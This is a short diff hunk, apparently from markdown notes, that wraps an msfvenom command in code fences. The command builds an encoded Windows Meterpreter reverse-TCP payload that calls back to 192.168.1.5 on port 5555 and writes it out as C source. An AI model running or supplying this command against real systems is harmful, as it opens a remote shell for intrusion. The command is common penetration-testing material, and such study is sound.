@@ -7,7 +7,8 @@
 
 
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=5555 -e x86/shikata_ga_nai -b "\x00" -i 15 -f num -o payload.c
+```msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=5555 -e x86/shikata_ga_nai -b "\x00" -i 15 -f num -o payload.c```
+
 
 
 
